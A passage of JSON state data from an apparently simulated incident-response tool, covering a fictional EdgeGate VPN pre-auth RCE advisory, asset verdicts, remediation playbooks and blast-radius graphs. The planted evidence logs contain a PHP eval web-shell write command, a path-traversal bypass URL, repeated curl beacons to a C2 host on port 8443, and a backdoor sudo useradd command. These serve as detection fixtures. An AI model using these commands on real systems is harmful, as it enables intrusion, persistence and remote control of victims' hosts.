            "Missing 1 days of historical telemetry (44/45 days retained)"
          ],
          "has_retention_blindspot": true
        },
        {
          "source_type": "auth",
          "required_days": 45,
          "available_days": 45,
          "coverage_ratio": 1.0,
          "gaps": [],
          "has_retention_blindspot": false
        },
        {
          "source_type": "network",
          "required_days": 45,
          "available_days": 44,
          "coverage_ratio": 0.978,
          "gaps": [
            "Missing 1 days of historical telemetry (44/45 days retained)"
          ],
          "has_retention_blindspot": true
        },
        {
          "source_type": "file",
          "required_days": 45,
          "available_days": 45,
          "coverage_ratio": 1.0,
          "gaps": [],
          "has_retention_blindspot": false
        }
      ],
      "adequate": true,
      "blind_spots": [
        "ENDPOINT: Only 44 of 45 days available",
        "NETWORK: Only 44 of 45 days available"
      ],
      "recommendations": [
        "Log coverage is sufficient to assess pre-disclosure exploitation with high confidence."
      ]
    },
    "verdict": {
      "asset_id": "ASSET-HARBOR-001",
      "advisory_id": "SIM-2026-0001",
      "state": "No evidence found",
      "confidence": "high",
      "reasons": [
        {
          "text": "No indicators of compromise or anomalous exploit behaviors detected across 99% telemetry coverage over the past 45 days.",
          "evidence_ids": [
            "COV-VERIFIED-harbor-vpn-gw-01"
          ]
        }
      ],
      "coverage_score": 0.991,
      "coverage_report": {
        "asset_id": "ASSET-HARBOR-001",
        "overall_coverage": 0.991,
        "sources": [
          {
            "source_type": "web",
            "required_days": 45,
            "available_days": 45,
            "coverage_ratio": 1.0,
            "gaps": [],
            "has_retention_blindspot": false
          },
          {
            "source_type": "endpoint",
            "required_days": 45,
            "available_days": 44,
            "coverage_ratio": 0.978,
            "gaps": [
              "Missing 1 days of historical telemetry (44/45 days retained)"
            ],
            "has_retention_blindspot": true
          },
          {
            "source_type": "auth",
            "required_days": 45,
            "available_days": 45,
            "coverage_ratio": 1.0,
            "gaps": [],
            "has_retention_blindspot": false
          },
          {
            "source_type": "network",
            "required_days": 45,
            "available_days": 44,
            "coverage_ratio": 0.978,
            "gaps": [
              "Missing 1 days of historical telemetry (44/45 days retained)"
            ],
            "has_retention_blindspot": true
          },
          {
            "source_type": "file",
            "required_days": 45,
            "available_days": 45,
            "coverage_ratio": 1.0,
            "gaps": [],
            "has_retention_blindspot": false
          }
        ],
        "adequate": true,
        "blind_spots": [
          "ENDPOINT: Only 44 of 45 days available",
          "NETWORK: Only 44 of 45 days available"
        ],
        "recommendations": [
          "Log coverage is sufficient to assess pre-disclosure exploitation with high confidence."
        ]
      },
      "evaluated_at": "2026-10-18T17:48:03.087421+00:00",
      "verdict_hash": "3fd93c250d9e8f699aeef34a2968c1112493007c97e381281b6d9438fd6cf380"
    },
    "gate": {
      "asset_id": "ASSET-HARBOR-001",
      "advisory_id": "SIM-2026-0001",
      "outcome": "Patch now",
      "gate_locked": false,
      "required_roles": [
        "Asset_Owner"
      ],
      "override_applied": false,
      "override_reason": null,
      "override_approver": null,
      "status": "pending",
      "created_at": "2026-10-18T17:48:03.087429+00:00"
    },
    "clock": {
      "asset_id": "ASSET-HARBOR-001",
      "advisory_id": "SIM-2026-0001",
      "profile": "CERT-In 12h/1d/3d/5d",
      "target_tier": "emergency (12h)",
      "start_time": "2026-10-18T17:48:03.112969+00:00",
      "deadline_time": "2026-10-19T05:48:03.112969+00:00",
      "seconds_remaining": 43200,
      "is_paused": false,
      "is_breached": false,
      "pause_reason": null
    },
    "playbook": {
      "id": "PLAYBOOK-ASSET-HARBOR-001-CVE-2026-9901",
      "advisory_id": "SIM-2026-0001",
      "asset_id": "ASSET-HARBOR-001",
      "steps": [
        {
          "step_id": "STEP-CONT-01",
          "title": "Network Containment / VLAN Isolation",
          "phase": "containment",
          "description": "Isolate harbor-vpn-gw-01 (192.0.2.44) from production network to quarantine VLAN to prevent lateral movement.",
          "owner": "secops-analyst@postern.local",
          "status": "pending",
          "verification_method": "Verify ping loss from internal LAN subnet while preserving access via out-of-band management.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CONT-02",
          "title": "Forensic Evidence Preservation",
          "phase": "containment",
          "description": "Take live memory snapshot and preserve volatile network socket states before host reboot or patching.",
          "owner": "dfir-lead@postern.local",
          "status": "pending",
          "verification_method": "Confirm cryptographic SHA-256 hash generated for memory dump image.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CLEAN-01",
          "title": "Terminate All Stolen Active Sessions",
          "phase": "cleanup",
          "description": "Flush all authenticated VPN and admin session tokens from memory and local session store (e.g. /var/run/edgegate/sessions).",
          "owner": "sysadmin@postern.local",
          "status": "pending",
          "verification_method": "Query auth daemon session table to confirm 0 active sessions remain.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CLEAN-02",
          "title": "Remove Unauthorized Web Shells & Implants",
          "phase": "cleanup",
          "description": "Scan and remove /var/www/html/assets/.sys_cache.php and check file integrity of web portal root.",
          "owner": "sysadmin@postern.local",
          "status": "pending",
          "verification_method": "Run file integrity checker to verify directory matches pristine distribution hash.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CLEAN-03",
          "title": "Rotate Administrator & Service Credentials",
          "phase": "cleanup",
          "description": "Rotate master LDAP/AD bind credentials, local root passwords, and VPN preshared keys.",
          "owner": "iam-admin@postern.local",
          "status": "pending",
          "verification_method": "Check password last-changed timestamp in directory service.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CLEAN-04",
          "title": "Audit Local Accounts for Dormant Backdoors",
          "phase": "cleanup",
          "description": "Check /etc/passwd and /etc/shadow for unauthorized accounts such as 'svc_sec_audit' or 'backdoor_adm'.",
          "owner": "secops-analyst@postern.local",
          "status": "pending",
          "verification_method": "Verify diff against baseline authorized user manifest.",
          "verified_at": null,
          "verified_by": null
        }
      ]
    },
    "blast_radius": {
      "asset_id": "ASSET-HARBOR-001",
      "root_node_id": "harbor-vpn-gw-01",
      "nodes": [
        {
          "id": "harbor-vpn-gw-01",
          "label": "harbor-vpn-gw-01 (Focal Gateway)",
          "type": "host",
          "criticality": "critical",
          "compromised": false
        },
        {
          "id": "harbor-dc-ad-01",
          "label": "Domain Controller (Active Directory)",
          "type": "dc",
          "criticality": "critical",
          "compromised": false
        },
        {
          "id": "harbor-db-primary-01",
          "label": "Core Transaction Database (PostgreSQL)",
          "type": "database",
          "criticality": "critical",
          "compromised": false
        },
        {
          "id": "harbor-jump-host-01",
          "label": "Bastion / Jump Host (OpenSSH)",
          "type": "host",
          "criticality": "high",
          "compromised": false
        },
        {
          "id": "harbor-cred-vault",
          "label": "Service Account / Kerberos Tickets",
          "type": "credential",
          "criticality": "high",
          "compromised": false
        },
        {
          "id": "harbor-s3-backup",
          "label": "Cold Cloud Storage Backups",
          "type": "service",
          "criticality": "medium",
          "compromised": false
        }
      ],
      "links": [
        {
          "source": "harbor-vpn-gw-01",
          "target": "harbor-cred-vault",
          "relationship": "shared_secret",
          "risk_level": "medium"
        },
        {
          "source": "harbor-vpn-gw-01",
          "target": "harbor-jump-host-01",
          "relationship": "network_egress",
          "risk_level": "low"
        },
        {
          "source": "harbor-cred-vault",
          "target": "harbor-dc-ad-01",
          "relationship": "admin_access",
          "risk_level": "low"
        },
        {
          "source": "harbor-jump-host-01",
          "target": "harbor-db-primary-01",
          "relationship": "trusts",
          "risk_level": "medium"
        },
        {
          "source": "harbor-dc-ad-01",
          "target": "harbor-s3-backup",
          "relationship": "active_session",
          "risk_level": "medium"
        }
      ],
      "blast_radius_score": 22,
      "summary": "Contained Blast Radius: Normal trust paths present; no active lateral credential exposure detected."
    }
  },
  "ASSET-HARBOR-003": {
    "asset": {
      "id": "ASSET-HARBOR-003",
      "host_name": "harbor-web-portal-01",
      "tenant_id": "harbor-logistics",
      "owner": "admin@harborlogistics.in",
      "product": "EdgeGate VPN",
      "version": "9.1.2",
      "internet_facing": true,
      "criticality": "critical",
      "timezone": "Asia/Kolkata",
      "ip_address": "192.0.2.147",
      "exposure_tier": "emergency",
      "status": "matched",
      "notes": null
    },
    "advisory": {
      "id": "SIM-2026-0001",
      "cve_id": "CVE-2026-9901",
      "title": "EdgeGate VPN Pre-Auth RCE & Session Hijack",
      "vendor": "EdgeGate Networks",
      "product": "EdgeGate VPN",
      "affected_versions": [
        ">=9.0.0",
        "<=9.2.3"
      ],
      "vuln_class": "Pre-Auth Remote Code Execution (CWE-287 / CWE-78)",
      "exploitation_status": "known_exploited",
      "disclosure_date": "2026-10-09T08:00:00Z",
      "first_known_exploitation_date": "2026-10-04T00:00:00Z",
      "vendor_mitigations": [
        "Upgrade to firmware 9.2.4+",
        "Restrict /api/v1/auth/session to management subnet"
      ],
      "cleanup_notes": [
        "Kill all active admin sessions",
        "Scan /var/www/html/assets/ for .sys_cache.php",
        "Review local admin accounts"
      ],
      "indicators": [
        "198.51.100.42",
        "/var/www/html/assets/.sys_cache.php",
        "svc_sec_audit",
        "198.51.100.89"
      ],
      "raw_text": "SECURITY ADVISORY SIM-2026-0001 (CRITICAL)\nProduct: EdgeGate VPN Gateway versions 9.0.0 through 9.2.3.\nDisclosed: October 9, 2026. First observed in the wild: October 4, 2026.\nVulnerability Class: Pre-Authentication Remote Code Execution and Session Hijack (CWE-287 / CWE-78).\nAttackers exploit crafted HTTP POST requests to /api/v1/auth/session to bypass authentication and execute code as root.\nFollowing exploitation, attackers commonly plant a web shell at /var/www/html/assets/.sys_cache.php or .sess_key.so.\nIntruders maintain persistent outbound command-and-control beaconing over TLS port 8443 to unusual IP ranges.\nAdditionally, attackers create dormant local administrator accounts such as svc_sec_audit or backdoor_adm.\nPatching to version 9.2.4 or higher fixes the flaw. However, patching alone does NOT terminate valid stolen sessions or remove planted web shells.\nPost-patch verification must confirm termination of all active sessions, removal of unauthorized files, and credential rotation.",
      "source_sentences": [
        {
          "id": "SENT-01",
          "sentence": "SECURITY ADVISORY SIM-2026-0001 (CRITICAL)",
          "confidence": 0.98
        },
        {
          "id": "SENT-02",
          "sentence": "Product: EdgeGate VPN Gateway versions 9.0.0 through 9.2.3.",
          "confidence": 0.98
        },
        {
          "id": "SENT-03",
          "sentence": "Disclosed: October 9, 2026. First observed in the wild: October 4, 2026.",
          "confidence": 0.98
        },
        {
          "id": "SENT-04",
          "sentence": "Vulnerability Class: Pre-Authentication Remote Code Execution and Session Hijack (CWE-287 / CWE-78).",
          "confidence": 0.98
        },
        {
          "id": "SENT-05",
          "sentence": "Attackers exploit crafted HTTP POST requests to /api/v1/auth/session to bypass authentication and execute code as root.",
          "confidence": 0.98
        },
        {
          "id": "SENT-06",
          "sentence": "Following exploitation, attackers commonly plant a web shell at /var/www/html/assets/.sys_cache.php or .sess_key.so.",
          "confidence": 0.98
        },
        {
          "id": "SENT-07",
          "sentence": "Intruders maintain persistent outbound command-and-control beaconing over TLS port 8443 to unusual IP ranges.",
          "confidence": 0.98
        },
        {
          "id": "SENT-08",
          "sentence": "Additionally, attackers create dormant local administrator accounts such as svc_sec_audit or backdoor_adm.",
          "confidence": 0.98
        },
        {
          "id": "SENT-09",
          "sentence": "Patching to version 9.2.4 or higher fixes the flaw. However, patching alone does NOT terminate valid stolen sessions or remove planted web shells.",
          "confidence": 0.98
        },
        {
          "id": "SENT-10",
          "sentence": "Post-patch verification must confirm termination of all active sessions, removal of unauthorized files, and credential rotation.",
          "confidence": 0.98
        }
      ],
      "created_at": "2026-10-09T08:00:00Z"
    },
    "evidence": [
      {
        "event_id": "EV-PLANTED-harbor-web-portal-01-01",
        "asset_id": "ASSET-HARBOR-003",
        "tenant_id": "harbor-logistics",
        "timestamp": "2026-10-04T03:45:00",
        "source_type": "web",
        "event_action": "crafted_request",
        "signal_class": "access",
        "confidence": "high",
        "details": {
          "event_id": "EV-PLANTED-harbor-web-portal-01-01",
          "timestamp": "2026-10-04T03:45:00",
          "tenant_id": "harbor-logistics",
          "host_name": "harbor-web-portal-01",
          "source_type": "web",
          "event_action": "crafted_request",
          "user_name": "anonymous",
          "process_name": "edgegate_httpd",
          "process_cmdline": "/usr/sbin/edgegate_httpd -D FOREGROUND",
          "file_path": "/api/v1/auth/session",
          "http_method": "POST",
          "url_path": "/api/v1/auth/session?bypass=../../bin/sh",
          "status_code": 200,
          "src_ip": "203.0.113.195",
          "dst_ip": "192.0.2.147",
          "dst_port": 443,
          "network_bytes": 4096
        },
        "content_hash": "1ba3f8d2650d7e4cffa09ed8a601e0878c2b3a3cd6c14e9c51f05b32ca50bcb9"
      },
      {
        "event_id": "EV-PLANTED-harbor-web-portal-01-02",
        "asset_id": "ASSET-HARBOR-003",
        "tenant_id": "harbor-logistics",
        "timestamp": "2026-10-05T21:40:00",
        "source_type": "file",
        "event_action": "file_write_served_dir",
        "signal_class": "persistence",
        "confidence": "high",
        "details": {
          "event_id": "EV-PLANTED-harbor-web-portal-01-02",
          "timestamp": "2026-10-05T21:40:00",
          "tenant_id": "harbor-logistics",
          "host_name": "harbor-web-portal-01",
          "source_type": "file",
          "event_action": "file_write_served_dir",
          "user_name": "www-data",
          "process_name": "sh",
          "process_cmdline": "/bin/sh -c 'echo <?php eval($_POST[x]); ?> > /var/www/html/assets/.sys_cache.php'",
          "file_path": "/var/www/html/assets/.sys_cache.php",
          "http_method": "N/A",
          "url_path": "N/A",
          "status_code": 0,
          "src_ip": "N/A",
          "dst_ip": "N/A",
          "dst_port": 0,
          "network_bytes": 1024
        },
        "content_hash": "054e323ba49b04efc003db1788b52e7f9875163af21edf781442c60ddec7bdd9"
      },
      {
        "event_id": "EV-PLANTED-harbor-web-portal-01-03-0",
        "asset_id": "ASSET-HARBOR-003",
        "tenant_id": "harbor-logistics",
        "timestamp": "2026-10-08T10:00:00",
        "source_type": "network",
        "event_action": "periodic_egress_c2",
        "signal_class": "outbound_control",
        "confidence": "high",
        "details": {
          "event_id": "EV-PLANTED-harbor-web-portal-01-03-0",
          "timestamp": "2026-10-08T10:00:00",
          "tenant_id": "harbor-logistics",
          "host_name": "harbor-web-portal-01",
          "source_type": "network",
          "event_action": "periodic_egress_c2",
          "user_name": "root",
          "process_name": "curl",
          "process_cmdline": "curl -s -k https://198.51.100.42:8443/checkin",
          "file_path": "N/A",
          "http_method": "CONNECT",
          "url_path": "/checkin",
          "status_code": 200,
          "src_ip": "192.0.2.147",
          "dst_ip": "198.51.100.42",
          "dst_port": 8443,
          "network_bytes": 512
        },
        "content_hash": "3a4e2b024b3a415a68ad598c30449ac6ac1cea98921ca67dc41dfbe4ce3963ad"
      },
      {
        "event_id": "EV-PLANTED-harbor-web-portal-01-03-1",
        "asset_id": "ASSET-HARBOR-003",
        "tenant_id": "harbor-logistics",
        "timestamp": "2026-10-08T09:45:00",
        "source_type": "network",
        "event_action": "periodic_egress_c2",
        "signal_class": "outbound_control",
        "confidence": "high",
        "details": {
          "event_id": "EV-PLANTED-harbor-web-portal-01-03-1",
          "timestamp": "2026-10-08T09:45:00",
          "tenant_id": "harbor-logistics",
          "host_name": "harbor-web-portal-01",
          "source_type": "network",
          "event_action": "periodic_egress_c2",
          "user_name": "root",
          "process_name": "curl",
          "process_cmdline": "curl -s -k https://198.51.100.42:8443/checkin",
          "file_path": "N/A",
          "http_method": "CONNECT",
          "url_path": "/checkin",
          "status_code": 200,
          "src_ip": "192.0.2.147",
          "dst_ip": "198.51.100.42",
          "dst_port": 8443,
          "network_bytes": 512
        },
        "content_hash": "f267e5cd0a355b348bfed7a20c01b12ef4e4c3b48bf5c9158a7ddd5eaa96cc4b"
      },
      {
        "event_id": "EV-PLANTED-harbor-web-portal-01-03-2",
        "asset_id": "ASSET-HARBOR-003",
        "tenant_id": "harbor-logistics",
        "timestamp": "2026-10-08T09:30:00",
        "source_type": "network",
        "event_action": "periodic_egress_c2",
        "signal_class": "outbound_control",
        "confidence": "high",
        "details": {
          "event_id": "EV-PLANTED-harbor-web-portal-01-03-2",
          "timestamp": "2026-10-08T09:30:00",
          "tenant_id": "harbor-logistics",
          "host_name": "harbor-web-portal-01",
          "source_type": "network",
          "event_action": "periodic_egress_c2",
          "user_name": "root",
          "process_name": "curl",
          "process_cmdline": "curl -s -k https://198.51.100.42:8443/checkin",
          "file_path": "N/A",
          "http_method": "CONNECT",
          "url_path": "/checkin",
          "status_code": 200,
          "src_ip": "192.0.2.147",
          "dst_ip": "198.51.100.42",
          "dst_port": 8443,
          "network_bytes": 512
        },
        "content_hash": "354b3064c54de18a9aa01be89b5a32cc89746e7f32930f59031716a462991bb6"
      },
      {
        "event_id": "EV-PLANTED-harbor-web-portal-01-03-3",
        "asset_id": "ASSET-HARBOR-003",
        "tenant_id": "harbor-logistics",
        "timestamp": "2026-10-08T09:15:00",
        "source_type": "network",
        "event_action": "periodic_egress_c2",
        "signal_class": "outbound_control",
        "confidence": "high",
        "details": {
          "event_id": "EV-PLANTED-harbor-web-portal-01-03-3",
          "timestamp": "2026-10-08T09:15:00",
          "tenant_id": "harbor-logistics",
          "host_name": "harbor-web-portal-01",
          "source_type": "network",
          "event_action": "periodic_egress_c2",
          "user_name": "root",
          "process_name": "curl",
          "process_cmdline": "curl -s -k https://198.51.100.42:8443/checkin",
          "file_path": "N/A",
          "http_method": "CONNECT",
          "url_path": "/checkin",
          "status_code": 200,
          "src_ip": "192.0.2.147",
          "dst_ip": "198.51.100.42",
          "dst_port": 8443,
          "network_bytes": 512
        },
        "content_hash": "402543b5e49cd18b6830077e4f38331149b44d4ce7974e798ca51b8d0381f420"
      },
      {
        "event_id": "EV-PLANTED-harbor-web-portal-01-03-4",
        "asset_id": "ASSET-HARBOR-003",
        "tenant_id": "harbor-logistics",
        "timestamp": "2026-10-08T09:00:00",
        "source_type": "network",
        "event_action": "periodic_egress_c2",
        "signal_class": "outbound_control",
        "confidence": "high",
        "details": {
          "event_id": "EV-PLANTED-harbor-web-portal-01-03-4",
          "timestamp": "2026-10-08T09:00:00",
          "tenant_id": "harbor-logistics",
          "host_name": "harbor-web-portal-01",
          "source_type": "network",
          "event_action": "periodic_egress_c2",
          "user_name": "root",
          "process_name": "curl",
          "process_cmdline": "curl -s -k https://198.51.100.42:8443/checkin",
          "file_path": "N/A",
          "http_method": "CONNECT",
          "url_path": "/checkin",
          "status_code": 200,
          "src_ip": "192.0.2.147",
          "dst_ip": "198.51.100.42",
          "dst_port": 8443,
          "network_bytes": 512
        },
        "content_hash": "694819303ab0d066c4c030affffa4a12328cc7ed9b0fe904788cc54d55336509"
      },
      {
        "event_id": "EV-PLANTED-harbor-web-portal-01-03-5",
        "asset_id": "ASSET-HARBOR-003",
        "tenant_id": "harbor-logistics",
        "timestamp": "2026-10-08T08:45:00",
        "source_type": "network",
        "event_action": "periodic_egress_c2",
        "signal_class": "outbound_control",
        "confidence": "high",
        "details": {
          "event_id": "EV-PLANTED-harbor-web-portal-01-03-5",
          "timestamp": "2026-10-08T08:45:00",
          "tenant_id": "harbor-logistics",
          "host_name": "harbor-web-portal-01",
          "source_type": "network",
          "event_action": "periodic_egress_c2",
          "user_name": "root",
          "process_name": "curl",
          "process_cmdline": "curl -s -k https://198.51.100.42:8443/checkin",
          "file_path": "N/A",
          "http_method": "CONNECT",
          "url_path": "/checkin",
          "status_code": 200,
          "src_ip": "192.0.2.147",
          "dst_ip": "198.51.100.42",
          "dst_port": 8443,
          "network_bytes": 512
        },
        "content_hash": "b78192b3c058cd71e23fc913a9ef6ff93b7cf0253c220a48aac01e47eab4f669"
      },
      {
        "event_id": "EV-PLANTED-harbor-web-portal-01-04",
        "asset_id": "ASSET-HARBOR-003",
        "tenant_id": "harbor-logistics",
        "timestamp": "2026-10-10T17:15:00",
        "source_type": "auth",
        "event_action": "user_add_privileged",
        "signal_class": "privilege_change",
        "confidence": "high",
        "details": {
          "event_id": "EV-PLANTED-harbor-web-portal-01-04",
          "timestamp": "2026-10-10T17:15:00",
          "tenant_id": "harbor-logistics",
          "host_name": "harbor-web-portal-01",
          "source_type": "auth",
          "event_action": "user_add_privileged",
          "user_name": "root",
          "process_name": "useradd",
          "process_cmdline": "/usr/sbin/useradd -m -s /bin/bash -G sudo svc_sec_audit",
          "file_path": "/etc/passwd",
          "http_method": "N/A",
          "url_path": "N/A",
          "status_code": 0,
          "src_ip": "N/A",
          "dst_ip": "N/A",
          "dst_port": 0,
          "network_bytes": 0
        },
        "content_hash": "9169a938b4ba9e48e55d75f8a4dfe0b69fcebeccb8c12dbf51c5fb48ccd1c966"
      }
    ],
    "coverage": {
      "asset_id": "ASSET-HARBOR-003",
      "overall_coverage": 0.982,
      "sources": [
        {
          "source_type": "web",
          "required_days": 45,
          "available_days": 44,
          "coverage_ratio": 0.978,
          "gaps": [
            "Missing 1 days of historical telemetry (44/45 days retained)"
          ],
          "has_retention_blindspot": true
        },
        {
          "source_type": "endpoint",
          "required_days": 45,
          "available_days": 44,
          "coverage_ratio": 0.978,
          "gaps": [
            "Missing 1 days of historical telemetry (44/45 days retained)"
          ],
          "has_retention_blindspot": true
        },
        {
          "source_type": "auth",
          "required_days": 45,
          "available_days": 44,
          "coverage_ratio": 0.978,
          "gaps": [
            "Missing 1 days of historical telemetry (44/45 days retained)"
          ],
          "has_retention_blindspot": true
        },
        {
          "source_type": "network",
          "required_days": 45,
          "available_days": 44,
          "coverage_ratio": 0.978,
          "gaps": [
            "Missing 1 days of historical telemetry (44/45 days retained)"
          ],
          "has_retention_blindspot": true
        },
        {
          "source_type": "file",
          "required_days": 45,
          "available_days": 45,
          "coverage_ratio": 1.0,
          "gaps": [],
          "has_retention_blindspot": false
        }
      ],
      "adequate": true,
      "blind_spots": [
        "WEB: Only 44 of 45 days available",
        "ENDPOINT: Only 44 of 45 days available",
        "AUTH: Only 44 of 45 days available",
        "NETWORK: Only 44 of 45 days available"
      ],
      "recommendations": [
        "Log coverage is sufficient to assess pre-disclosure exploitation with high confidence."
      ]
    },
    "verdict": {
      "asset_id": "ASSET-HARBOR-003",
      "advisory_id": "SIM-2026-0001",
      "state": "Likely compromised",
      "confidence": "high",
      "reasons": [
        {
          "text": "Pre-authentication exploitation request observed on 2026-10-04T03:45:00 targeting /api/v1/auth/session?bypass=../../bin/sh matching known CVE bypass patterns.",
          "evidence_ids": [
            "EV-PLANTED-harbor-web-portal-01-01"
          ]
        },
        {
          "text": "Unauthorized web shell written to served web directory at /var/www/html/assets/.sys_cache.php by service account on 2026-10-05T21:40:00.",
          "evidence_ids": [
            "EV-PLANTED-harbor-web-portal-01-02"
          ]
        },
        {
          "text": "Periodic TLS command-and-control beaconing identified to non-standard destination 198.51.100.42:8443.",
          "evidence_ids": [
            "EV-PLANTED-harbor-web-portal-01-03-0",
            "EV-PLANTED-harbor-web-portal-01-03-1",
            "EV-PLANTED-harbor-web-portal-01-03-2",
            "EV-PLANTED-harbor-web-portal-01-03-3",
            "EV-PLANTED-harbor-web-portal-01-03-4",
            "EV-PLANTED-harbor-web-portal-01-03-5"
          ]
        },
        {
          "text": "Dormant administrative user created via command line '/usr/sbin/useradd -m -s /bin/bash -G sudo svc_sec_audit' on 2026-10-10T17:15:00 to establish post-patch persistence.",
          "evidence_ids": [
            "EV-PLANTED-harbor-web-portal-01-04"
          ]
        }
      ],
      "coverage_score": 0.982,
      "coverage_report": {
        "asset_id": "ASSET-HARBOR-003",
        "overall_coverage": 0.982,
        "sources": [
          {
            "source_type": "web",
            "required_days": 45,
            "available_days": 44,
            "coverage_ratio": 0.978,
            "gaps": [
              "Missing 1 days of historical telemetry (44/45 days retained)"
            ],
            "has_retention_blindspot": true
          },
          {
            "source_type": "endpoint",
            "required_days": 45,
            "available_days": 44,
            "coverage_ratio": 0.978,
            "gaps": [
              "Missing 1 days of historical telemetry (44/45 days retained)"
            ],
            "has_retention_blindspot": true
          },
          {
            "source_type": "auth",
            "required_days": 45,
            "available_days": 44,
            "coverage_ratio": 0.978,
            "gaps": [
              "Missing 1 days of historical telemetry (44/45 days retained)"
            ],
            "has_retention_blindspot": true
          },
          {
            "source_type": "network",
            "required_days": 45,
            "available_days": 44,
            "coverage_ratio": 0.978,
            "gaps": [
              "Missing 1 days of historical telemetry (44/45 days retained)"
            ],
            "has_retention_blindspot": true
          },
          {
            "source_type": "file",
            "required_days": 45,
            "available_days": 45,
            "coverage_ratio": 1.0,
            "gaps": [],
            "has_retention_blindspot": false
          }
        ],
        "adequate": true,
        "blind_spots": [
          "WEB: Only 44 of 45 days available",
          "ENDPOINT: Only 44 of 45 days available",
          "AUTH: Only 44 of 45 days available",
          "NETWORK: Only 44 of 45 days available"
        ],
        "recommendations": [
          "Log coverage is sufficient to assess pre-disclosure exploitation with high confidence."
        ]
      },
      "evaluated_at": "2026-10-18T17:48:03.091996+00:00",
      "verdict_hash": "abe511343ea5ed8566eae02a39ea147c77d1804e752e9733b01efbd61f89d574"
    },
    "gate": {
      "asset_id": "ASSET-HARBOR-003",
      "advisory_id": "SIM-2026-0001",
      "outcome": "Contain first then patch",
      "gate_locked": true,
      "required_roles": [
        "Incident_Lead",
        "Security_Approver"
      ],
      "override_applied": false,
      "override_reason": null,
      "override_approver": null,
      "status": "pending",
      "created_at": "2026-10-18T17:48:03.092000+00:00"
    },
    "clock": {
      "asset_id": "ASSET-HARBOR-003",
      "advisory_id": "SIM-2026-0001",
      "profile": "CERT-In 12h/1d/3d/5d",
      "target_tier": "emergency (12h)",
      "start_time": "2026-10-18T17:48:03.112993+00:00",
      "deadline_time": "2026-10-19T05:48:03.112993+00:00",
      "seconds_remaining": 43200,
      "is_paused": false,
      "is_breached": false,
      "pause_reason": null
    },
    "playbook": {
      "id": "PLAYBOOK-ASSET-HARBOR-003-CVE-2026-9901",
      "advisory_id": "SIM-2026-0001",
      "asset_id": "ASSET-HARBOR-003",
      "steps": [
        {
          "step_id": "STEP-CONT-01",
          "title": "Network Containment / VLAN Isolation",
          "phase": "containment",
          "description": "Isolate harbor-web-portal-01 (192.0.2.147) from production network to quarantine VLAN to prevent lateral movement.",
          "owner": "secops-analyst@postern.local",
          "status": "pending",
          "verification_method": "Verify ping loss from internal LAN subnet while preserving access via out-of-band management.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CONT-02",
          "title": "Forensic Evidence Preservation",
          "phase": "containment",
          "description": "Take live memory snapshot and preserve volatile network socket states before host reboot or patching.",
          "owner": "dfir-lead@postern.local",
          "status": "pending",
          "verification_method": "Confirm cryptographic SHA-256 hash generated for memory dump image.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CLEAN-01",
          "title": "Terminate All Stolen Active Sessions",
          "phase": "cleanup",
          "description": "Flush all authenticated VPN and admin session tokens from memory and local session store (e.g. /var/run/edgegate/sessions).",
          "owner": "sysadmin@postern.local",
          "status": "pending",
          "verification_method": "Query auth daemon session table to confirm 0 active sessions remain.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CLEAN-02",
          "title": "Remove Unauthorized Web Shells & Implants",
          "phase": "cleanup",
          "description": "Scan and remove /var/www/html/assets/.sys_cache.php and check file integrity of web portal root.",
          "owner": "sysadmin@postern.local",
          "status": "pending",
          "verification_method": "Run file integrity checker to verify directory matches pristine distribution hash.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CLEAN-03",
          "title": "Rotate Administrator & Service Credentials",
          "phase": "cleanup",
          "description": "Rotate master LDAP/AD bind credentials, local root passwords, and VPN preshared keys.",
          "owner": "iam-admin@postern.local",
          "status": "pending",
          "verification_method": "Check password last-changed timestamp in directory service.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CLEAN-04",
          "title": "Audit Local Accounts for Dormant Backdoors",
          "phase": "cleanup",
          "description": "Check /etc/passwd and /etc/shadow for unauthorized accounts such as 'svc_sec_audit' or 'backdoor_adm'.",
          "owner": "secops-analyst@postern.local",
          "status": "pending",
          "verification_method": "Verify diff against baseline authorized user manifest.",
          "verified_at": null,
          "verified_by": null
        }
      ]
    },
    "blast_radius": {
      "asset_id": "ASSET-HARBOR-003",
      "root_node_id": "harbor-web-portal-01",
      "nodes": [
        {
          "id": "harbor-web-portal-01",
          "label": "harbor-web-portal-01 (Focal Gateway)",
          "type": "host",
          "criticality": "critical",
          "compromised": true
        },
        {
          "id": "harbor-dc-ad-01",
          "label": "Domain Controller (Active Directory)",
          "type": "dc",
          "criticality": "critical",
          "compromised": false
        },
        {
          "id": "harbor-db-primary-01",
          "label": "Core Transaction Database (PostgreSQL)",
          "type": "database",
          "criticality": "critical",
          "compromised": false
        },
        {
          "id": "harbor-jump-host-01",
          "label": "Bastion / Jump Host (OpenSSH)",
          "type": "host",
          "criticality": "high",
          "compromised": false
        },
        {
          "id": "harbor-cred-vault",
          "label": "Service Account / Kerberos Tickets",
          "type": "credential",
          "criticality": "high",
          "compromised": true
        },
        {
          "id": "harbor-s3-backup",
          "label": "Cold Cloud Storage Backups",
          "type": "service",
          "criticality": "medium",
          "compromised": false
        }
      ],
      "links": [
        {
          "source": "harbor-web-portal-01",
          "target": "harbor-cred-vault",
          "relationship": "shared_secret",
          "risk_level": "high"
        },
        {
          "source": "harbor-web-portal-01",
          "target": "harbor-jump-host-01",
          "relationship": "network_egress",
          "risk_level": "high"
        },
        {
          "source": "harbor-cred-vault",
          "target": "harbor-dc-ad-01",
          "relationship": "admin_access",
          "risk_level": "high"
        },
        {
          "source": "harbor-jump-host-01",
          "target": "harbor-db-primary-01",
          "relationship": "trusts",
          "risk_level": "medium"
        },
        {
          "source": "harbor-dc-ad-01",
          "target": "harbor-s3-backup",
          "relationship": "active_session",
          "risk_level": "medium"
        }
      ],
      "blast_radius_score": 88,
      "summary": "CRITICAL BLAST RADIUS ALERT: Host harbor-web-portal-01 possesses active Kerberos tickets and SSH keys capable of pivoting directly to Domain Controller (harbor-dc-ad-01) and Primary Database. Immediate VLAN isolation prevents tier-0 domain compromise."
    }
  },
  "ASSET-HARBOR-015": {
